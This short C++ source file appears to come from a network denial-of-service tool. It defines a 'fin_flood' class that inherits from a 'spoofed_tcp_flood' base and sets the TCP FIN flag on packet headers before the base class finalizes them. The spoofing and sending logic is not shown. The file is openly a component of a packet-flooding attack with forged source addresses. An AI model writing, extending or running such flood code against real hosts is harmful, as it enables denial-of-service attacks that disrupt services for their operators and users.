#include "fin_flood.h"

fin_flood::fin_flood(std::shared_ptr<Config> config)
    : spoofed_tcp_flood(std::move(config)) {}

void fin_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
  tcp->th_flags = TH_FIN;
  spoofed_tcp_flood::finalize_hdr(tcp, ip);
}
